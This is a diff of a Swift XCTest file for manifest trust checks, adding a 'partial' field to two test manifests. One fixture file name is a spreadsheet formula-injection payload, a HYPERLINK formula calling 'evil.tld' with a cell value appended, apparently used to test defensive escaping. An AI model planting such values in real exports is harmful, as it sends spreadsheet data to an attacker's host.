@@ -36,7 +36,7 @@ final class ManifestTrustTests: XCTestCase {
             primaryDestination: primary.path(percentEncoded: false),
             archiveDestination: destinations.count > 1 ? destinations[1].path(percentEncoded: false) : nil,
             destinations: destinations.map { $0.path(percentEncoded: false) },
-            verified: true, filesCopied: entries.count, filesSkipped: 0, filesFailed: 0,
+            verified: true, partial: false, filesCopied: entries.count, filesSkipped: 0, filesFailed: 0,
             totalBytes: 0, elapsedSeconds: 0, files: entries)
         XCTAssertNotNil(ManifestWriter.write(m, intoRoot: primary, stamp: stamp ?? createdAt))
     }
@@ -220,7 +220,7 @@ final class ManifestTrustTests: XCTestCase {
             schema: Manifest.schemaID, app: Manifest.appName,
             createdAt: Date(timeIntervalSince1970: 0), source: nil,
             primaryDestination: "/tmp", archiveDestination: nil, destinations: nil,
-            verified: true, filesCopied: 1, filesSkipped: 0, filesFailed: 0,
+            verified: true, partial: false, filesCopied: 1, filesSkipped: 0, filesFailed: 0,
             totalBytes: 0, elapsedSeconds: 0,
             files: [ManifestEntry(name: #"=HYPERLINK("https://evil.tld/?"&A2,"OK").CR2"#,
                                   path: "2026/a.bin", bytes: 0, xxhash64: "0", status: "copied")])
